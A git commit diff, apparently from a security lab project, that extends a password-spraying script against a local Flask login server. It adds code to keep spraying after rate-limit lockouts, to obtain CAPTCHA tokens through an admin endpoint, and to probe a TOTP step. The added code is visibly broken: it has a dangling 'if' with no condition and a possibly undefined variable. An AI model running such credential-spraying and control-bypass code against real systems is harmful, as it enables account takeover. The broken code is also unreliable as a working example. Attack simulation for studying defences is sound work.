b6523c5978aa2e365a2e6e36e17e3e9292b52503
Sasha <hlivnenko777@gmail.com>
2026-01-04 14:29:35 +0200

    [attack] simulating the attack on the server that protected by captcha

--- ps.py
+++ ps.py
@@ -9,6 +9,9 @@ from app import init_db
 
 LOGIN_URL = "http://127.0.0.1:5000/login"
 USERS = util.get_usernames_by_category()
+LOGIN_TOTP_URL = "http://127.0.0.1:5000/login_totp"
+CAPTCHA_URL = "http://127.0.0.1:5000/admin/get_captcha_token"
+GROUP_SEED = 114467408
 MAX_DURATION = 7200 #this is two hours 
 
 def run_server():
@@ -18,7 +21,7 @@ def password_spraying():
     
     with open("common_passwords.csv", newline="", encoding="utf-8") as f:
         reader = csv.reader(f)
-        header = next(reader)
+        next(reader)
         start = time.perf_counter()
         count = 0
         for row in reader:
@@ -36,13 +39,57 @@ def password_spraying():
                         success, code_resp = "/dashboard" in response.url, response.status_code 
                         #if success :
                          #   return 
+                        # ----- Rate-limit and Lockout -----
                         if code_resp == 429:
-                        
+                            print("User blocked")
                             count+=1
                             if count == 30:
                                 print("Attack has been blocked by the system")
-                                return 
+                                #return 
+                                
+                                
+                        # ----- CAPTCHA -----
+                        data = response.json()
+
+                        if data.get("captcha_required"):
+                            captcha = requests.post(
+                                CAPTCHA_URL + f"?group_seed={GROUP_SEED}",
+                                cookies=response.cookies
+                                )
                             
+                            data_captcha = captcha.json()
+                        
+                        if not data_captcha.get("captcha_required"):
+                            requests.post(
+                                LOGIN_URL,
+                                data={
+                                    "username": user,
+                                    "password": password,
+                                    "captcha_token": data_captcha.get("captcha_token")
+                                },
+                                cookies=response.cookies
+                            )   
+                            if 
+                                
+                                
+                        #------ TOTP -------
+                        if code_resp == 500: #If TOTP is required.
+                            
+                            totp_response = requests.post(
+                                LOGIN_TOTP_URL,  # TOTP verification URL
+                                data={
+                                    "username": user,
+                                    "TOTP_token": ""
+                                },
+                                cookies=response.cookies  #Retain session (cookies) to maintain state
+                            )
+                            #Log the failure (simulating a TOTP fail)
+                            if totp_response.status_code == 501:
+                                print(f"TOTP fail for user {user} with password {password}")
+                            
+                            break    
+                        
+
                     else:
                         print(f"Time limit reached ({elapsed_time:.2f}s)Shutting down.")
                         return 
